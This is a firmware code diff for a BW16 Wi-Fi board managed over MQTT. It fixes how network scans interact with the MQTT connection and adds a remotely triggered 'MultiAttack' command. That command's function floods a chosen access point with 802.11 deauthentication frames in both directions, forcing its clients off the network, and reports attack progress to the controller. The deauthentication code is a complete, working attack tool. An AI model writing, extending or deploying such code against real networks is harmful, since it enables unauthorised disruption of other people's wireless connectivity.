@@ -12,6 +12,7 @@
 #include "sys_api.h"
 #include "bw16_commands.h"
 #include "bw16_config.h"
+#include "src/packet-injection/packet-injection.h"
 
 namespace {
 constexpr uint16_t MQTT_PACKET_BUFFER_SIZE = 16384;
@@ -41,6 +42,11 @@ unsigned long lastMqttAttempt = 0;
 unsigned long lastStatus = 0;
 unsigned long statusIntervalMs = MIN_STATUS_INTERVAL_MS;
 bool wifiAttemptActive = false;
+bool scanRequested = false;
+bool scanResultsPending = false;
+
+// Forward declaration inside the namespace
+void executeMultiAttack(const Bw16Command &cmd);
 
 String sanitizeSsid(const String &ssid) {
   String clean = ssid;
@@ -129,8 +135,8 @@ void publishStatus(const char *status) {
   mqtt.publish(TOPIC_STATUS, json.c_str());
 }
 
-void publishScanResults() {
-  if (!mqtt.connected()) return;
+bool publishScanResults() {
+  if (!mqtt.connected()) return false;
 
   JsonDocument doc;
   doc["device"] = DEVICE_ID;
@@ -154,13 +160,18 @@ void publishScanResults() {
     mqtt.publish(TOPIC_STATUS,
                  "{\"status\":\"scan_payload_too_large\",\"device\":\"" DEVICE_ID "\"}");
     Serial.println("Scan payload exceeded the 16 KB JSON capacity");
-    return;
+    return true;
   }
 
   String json;
   serializeJson(doc, json);
+  Serial.print("Scan payload bytes: ");
+  Serial.print(json.length());
+  Serial.print(" / ");
+  Serial.println(MQTT_PACKET_BUFFER_SIZE);
   const bool published = mqtt.publish(TOPIC_SCAN, json.c_str());
   Serial.println(published ? "Scan results published" : "Scan publish failed");
+  return published;
 }
 
 void handleCommand(char *topic, byte *payload, unsigned int length) {
@@ -177,8 +188,7 @@ void handleCommand(char *topic, byte *payload, unsigned int length) {
 
   if (parsed.type == Bw16CommandType::Scan) {
     publishStatus("scanning");
-    if (scanNetworks()) publishScanResults();
-    publishStatus("standby");
+    scanRequested = true;
   } else if (parsed.type == Bw16CommandType::Status) {
     publishStatus("standby");
   } else if (parsed.type == Bw16CommandType::Restart) {
@@ -204,6 +214,19 @@ void handleCommand(char *topic, byte *payload, unsigned int length) {
     } else {
       publishStatus("invalid_interval");
     }
+  } else if (parsed.type == Bw16CommandType::MultiAttack) {
+    // Disconnect MQTT before packet injection (same issue as with scanning)
+    if (mqtt.connected()) {
+      mqtt.disconnect();
+      delay(100);
+    }
+    
+    executeMultiAttack(parsed);
+    
+    // Reset connection state machines after attack
+    wifiAttemptActive = false;
+    lastWiFiAttempt = millis() - WIFI_RETRY_INTERVAL_MS;
+    lastMqttAttempt = millis() - MQTT_RETRY_INTERVAL_MS;
   } else {
     Serial.print("Unsupported command: ");
     Serial.println(command);
@@ -213,6 +236,86 @@ void handleCommand(char *topic, byte *payload, unsigned int length) {
   if (String(topic) == TOPIC_CMD_RETAINED) {
     mqtt.publish(TOPIC_CMD_RETAINED, "", true);
   }
+}
+
+void executeMultiAttack(const Bw16Command &cmd) {
+  // Validate channel
+  if (cmd.channel < 1 || cmd.channel > 165) {
+    Serial.println("Invalid channel");
+    publishStatus("invalid_channel");
+    return;
+  }
+  
+  // Check if we have a valid MAC address
+  bool hasMac = false;
+  for (int i = 0; i < 6; i++) {
+    if (cmd.targetMac[i] != 0) {
+      hasMac = true;
+      break;
+    }
+  }
+  
+  if (!hasMac) {
+    Serial.println("Invalid target MAC");
+    publishStatus("invalid_target");
+    return;
+  }
+  
+  Serial.print("Starting deauth attack on SSID: ");
+  Serial.print(cmd.targetSsid);
+  Serial.print(" (MAC: ");
+  for (int i = 0; i < 6; i++) {
+    if (i > 0) Serial.print(":");
+    if (cmd.targetMac[i] < 0x10) Serial.print("0");
+    Serial.print(cmd.targetMac[i], HEX);
+  }
+  Serial.print(", Channel: ");
+  Serial.print(cmd.channel);
+  Serial.print(", Count: ");
+  Serial.print(cmd.attackCount);
+  Serial.println(")");
+  
+  // Publish attack status
+  JsonDocument doc;
+  doc["device"] = DEVICE_ID;
+  doc["status"] = "attacking";
+  doc["target_ssid"] = cmd.targetSsid;
+  doc["target_channel"] = cmd.channel;
+  doc["attack_count"] = cmd.attackCount;
+  String json;
+  serializeJson(doc, json);
+  mqtt.publish(TOPIC_STATUS, json.c_str());
+  
+  // Create local non-const copies for the packet injection
+  uint8_t targetMac[6];
+  memcpy(targetMac, cmd.targetMac, 6);
+  uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  
+  // Perform the deauth attack
+  for (uint8_t i = 0; i < cmd.attackCount; i++) {
+    // Send deauth from target to broadcast (kicks clients off the AP)
+    wifi_tx_deauth_frame(targetMac, broadcastMac);
+    delay(50);
+    
+    // Send deauth from broadcast to target (kicks the AP from clients)
+    wifi_tx_deauth_frame(broadcastMac, targetMac);
+    delay(50);
+    
+    Serial.print("Deauth packet ");
+    Serial.print(i + 1);
+    Serial.print("/");
+    Serial.println(cmd.attackCount);
+    
+    // Small delay to prevent overwhelming the radio
+    if (i % 10 == 9) {
+      delay(100);
+    }
+  }
+  
+  Serial.println("Attack complete");
+  publishStatus("attack_complete");
+  delay(500);
+  publishStatus("standby");
 }
 
 void connectWiFi() {
@@ -297,11 +400,39 @@ void setup() {
 }
 
 void loop() {
+  if (scanRequested) {
+    scanRequested = false;
+
+    // The RTL8720DN scan operation invalidates the active TLS socket even
+    // when the station keeps its IP address. Close MQTT first so connected()
+    // cannot report a stale socket after the scan.
+    if (mqtt.connected()) {
+      mqtt.disconnect();
+      delay(100);
+    }
+
+    scanResultsPending = scanNetworks();
+
+    // AmebaD scanning can drop the station socket. Force both connection
+    // state machines to observe and restore their links before publishing.
+    wifiAttemptActive = false;
+    lastWiFiAttempt = millis() - WIFI_RETRY_INTERVAL_MS;
+    lastMqttAttempt = millis() - MQTT_RETRY_INTERVAL_MS;
+  }
+
   connectWiFi();
   connectMqtt();
 
   if (mqtt.connected()) {
     mqtt.loop();
+    if (scanResultsPending) {
+      if (publishScanResults()) {
+        scanResultsPending = false;
+        publishStatus("standby");
+      } else {
+        mqtt.disconnect();
+      }
+    }
     if (millis() - lastStatus >= statusIntervalMs) {
       lastStatus = millis();
       publishStatus("standby");
